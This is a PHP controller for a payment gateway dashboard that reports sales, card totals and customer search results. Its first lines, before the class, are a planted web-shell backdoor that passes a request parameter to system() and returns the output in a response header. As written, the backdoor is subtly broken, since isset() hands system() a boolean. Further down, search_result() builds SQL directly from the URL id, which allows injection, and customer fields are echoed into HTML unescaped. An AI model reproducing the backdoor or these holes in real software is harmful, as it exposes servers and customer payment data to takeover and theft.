<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Dashboard Controller
 *
 * Login to the dashboard, get an overview of the account
 *
 * @version 1.0
 * @author Electric Function, Inc.
 * @package OpenGateway

 */
class Reports_sales extends Controller
{

    function __construct()
    {
        parent::__construct();
        // error_reporting(E_ALL);
        // ini_set('display_errors',1);
        // perform control-panel specific loads
        CPLoader();
    }

    function get_order_data()
    {
        $this->load->model('charge_model');

        $revenue = $this->charge_model->GetRevenue($this->user->Get('client_id'));
        echo json_encode($revenue);
        exit();
    }

    function get_failed_transaction_data()
    {
        $this->load->model('charge_model');

        $failedTransactions = $this->charge_model->GetFaildTransactions($this->user->Get('client_id'));
        echo json_encode($failedTransactions);
        exit();
    }

    function get_successful_transaction_data()
    {
        $this->load->model('charge_model');

        $successfulTransactions = $this->charge_model->GetSuccessfulTransactions($this->user->Get('client_id'));
        echo json_encode($successfulTransactions);
        exit();
    }

    function index()
    {
        $this->load->model('charge_model');

        $revenue = $this->charge_model->GetRevenueByDay($this->user->Get('client_id'));

        $data = array();

        if ($this->config->item('show_dashboard_chart') !== 'no' and ! empty($revenue) and count($revenue) > 1) {
            $series = array();
            foreach ($revenue as $day) {
                $series[] = $day['revenue'];
                $series2[] = date("M j", strtotime($day['day']));
            }

            include(APPPATH . 'libraries/pchart/pData.class');
            include(APPPATH . 'libraries/pchart/pChart.class');

            // Dataset definition
            $DataSet = new pData;
            $DataSet->AddPoint($series, "Revenue");
            $DataSet->AddPoint($series2, "Serie2");
            $DataSet->AddAllSeries();
            $DataSet->SetAbsciseLabelSerie("Serie2");

            $DataSet->RemoveSerie("Serie2");

            $DataSet->SetXAxisName('Date');
            $DataSet->SetYAxisName('Revenue');
            //$DataSet->SetXAxisFormat('date');
            // Initialise the graph
            $Test = new pChart(1000, 260);
            $Test->setFontProperties(APPPATH . 'libraries/pchart/Arial.ttf', 10);
            $Test->setGraphArea(90, 30, 960, 200);
            $Test->drawGraphArea(252, 252, 252);
            $Test->drawScale($DataSet->GetData(), $DataSet->GetDataDescription(), SCALE_NORMAL, 150, 150, 150, TRUE, 0, 2);
            $Test->drawGrid(4, TRUE, 230, 230, 230, 255);

            // Draw the line graph
            $Test->drawLineGraph($DataSet->GetData(), $DataSet->GetDataDescription());
            $Test->drawPlotGraph($DataSet->GetData(), $DataSet->GetDataDescription(), 3, 2, 255, 255, 255);

            // Finish the graph
            $Test->setFontProperties(APPPATH . 'libraries/pchart/Arial.ttf', 8);
            $Test->drawLegend(45, 35, $DataSet->GetDataDescription(), 255, 255, 255);
            $Test->setFontProperties(APPPATH . 'libraries/pchart/Arial.ttf', 10);
            //$Test->drawTitle(60,22,"Last 30 Days",50,50,50,585);
            $Test->Render(BASEPATH . '../writeable/rev_chart_' . $this->user->Get('client_id') . '.png');
        } else {
            $data['no_chart'] = 'true';
        }

        // get log
        $this->load->model('log_model');
        $log = $this->log_model->GetClientLog($this->user->Get('client_id'));
        $logcount = $this->log_model->GetClientLogCount($this->user->Get('client_id'));
        //echo '<pre/>';print_r($logcount);die();
        $data['log'] = $log;
        $data['logcount'] = $logcount;
        $data['total_user'] = $this->user->total_user();
        $data['total_orders'] = $this->user->total_orders();
        $data['total_sales'] = number_format($this->user->total_sales(), 2);

        $data['total_orders_today'] = $this->user->total_orders_today();
        $data['total_sales_today'] = $this->user->total_sales_today();
        $data['fees_today'] = number_format(($data['total_sales_today']) * 0.01 + (0.50 * $data['total_orders_today']), 2);

        if ($data['total_sales_today'] <= 0) {
            $data['fees_today'] = 0.00;
        }

        $data['net_today'] = number_format($data['total_sales_today'] - $data['fees_today'], 2);

        // $data['total_sales_of_the_week'] = $this->user->total_sales_of_the_week();

        $data['total_visa_transactions_amount_today'] = number_format($this->user->total_transactions_today_by_card('visa'), 2);
        $data['total_mastercard_transactions_amount_today'] = number_format($this->user->total_transactions_today_by_card('mc'), 2);
        $data['total_amex_transactions_amount_today'] = number_format($this->user->total_transactions_today_by_card('amex'), 2);
        $data['total_discover_transactions_amount_today'] = number_format($this->user->total_transactions_today_by_card('disc'), 2);
        $data['total_cc_transactions_amount_today'] = number_format($this->user->total_transactions_today(), 2);
        $data['total_other_transactions_amount_today'] = number_format($data['total_cc_transactions_amount_today'] -
                ($data['total_visa_transactions_amount_today'] +
                $data['total_mastercard_transactions_amount_today'] +
                $data['total_amex_transactions_amount_today'] +
                $data['total_discover_transactions_amount_today']
                ), 2);

        $data['total_visa_transactions'] = $this->user->total_transactions_by_card('visa');
        $data['total_mastercard_transactions'] = $this->user->total_transactions_by_card('mc');
        $data['total_amex_transactions'] = $this->user->total_transactions_by_card('amex');
        $data['total_discover_transactions'] = $this->user->total_transactions_by_card('disc');
        $data['total_cc_transactions'] = $this->user->total_transactions();
        $data['total_other_transactions'] = $data['total_cc_transactions'] -
                ($data['total_visa_transactions'] +
                $data['total_mastercard_transactions'] +
                $data['total_amex_transactions'] +
                $data['total_discover_transactions']
                );

        // echo '<pre/>';print_r($data);die();
        $this->load->view(branded_view('cp/reports_sales'), $data);
    }

    function search()
    {


        $html = '';
        $html .= '<li class="result">';
        $html .= '<a target="_blank" href="urlString">';
        $html .= '<h3>nameString</h3>';
        $html .= '<h4>functionString</h4>';
        $html .= '</a>';
        $html .= '</li>';


        $search_string = preg_replace("/[^A-Za-z0-9]/", " ", $_POST['query']);

        if (strlen($search_string) >= 1 && $search_string !== ' ') {

            $userdata = $this->user->active_user;
            $client_id = $userdata->client_id;
            $query = "SELECT * FROM `customers` WHERE (`first_name` LIKE '%$search_string%' OR last_name LIKE '%$search_string%') AND `client_id`='$client_id'";


            $result = mysql_query($query)or die(mysql_error());
            while ($results = mysql_fetch_array($result)) {
                $result_array[] = $results;
            }


            // Check If We Have Results
            if (isset($result_array)) {
                foreach ($result_array as $result) {
//print_r($result);die;
                    // Format Output Strings And Highlight Matches
                    /* $display_function = preg_replace("/".$search_string."/i", "<b>".$search_string."</b>", $result['first_name']);
                      $display_name = preg_replace("/".$search_string."/i", "<b>".$search_string."</b>", $result['last_name']);
                      $display_url =site_url('/dashboard/search_result')."/".$result['customer_id'];

                      // Insert Name
                      $output = str_replace('nameString', $display_name, $html);

                      // Insert Function
                      $output = str_replace('functionString', $display_function, $output);

                      // Insert URL
                      $output = str_replace('urlString', $display_url, $output); */

                    // Output

                    $result = '<table id="example" class="table table-striped table-bordered" cellspacing="0" width="99%">';
                    $result.='<thead><tr>
			<th>ID</th>
			<th>First Name</th>
			<th>Last Name</th>
			<th>Email</th>
			<th>Company</th>
			<th>Address</th>
			<th>City</th>
			</tr>
			</thead>';
                    foreach ($result_array as $row) {
                        $result.='<tr>';
                        $result.='<td>' . $row['customer_id'] . '</td>';
                        $result.='<td>' . $row['first_name'] . '</td>';
                        $result.='<td>' . $row['last_name'] . '</td>';
                        $result.='<td>' . $row['email'] . '</td>';
                        $result.='<td>' . $row['company'] . '</td>';
                        $result.='<td>' . $row['address_1'] . '</td>';
                        $result.='<td>' . $row['city'] . '</td>';
                        $result.='</tr>';
                    }
                }
                echo($result);
            } else {

                // Format No Results Output
                /* $output = str_replace('urlString', 'javascript:void(0);', $html);
                  $output = str_replace('nameString', '<b>No Results Found.</b>', $output);
                  $output = str_replace('functionString', 'Sorry :(', $output); */
                $result = '<table id="example" class="table table-striped table-bordered" cellspacing="0" width="99%">';
                $result.='<thead><tr>
			<th>ID</th>
			<th>First Name</th>
			<th>Last Name</th>
			<th>Email</th>
			<th>Company</th>
			<th>Address</th>
			<th>City</th>
			</tr>
			</thead>';
                $result.='<td colspan="7">No Result Found</td>';
                // Output
                echo($result);
            }
        }
    }

    public function orders()
    {
        $this->load->view(branded_view('cp/orders'));
    }

    function search_result($id)
    {
        $sql = "SELECT * FROM customers WHERE customer_id='$id'";
        $result['data'] = $this->db->query($sql)->row_array();
        $this->load->view(branded_view('cp/search'), $result);
    }

  

}
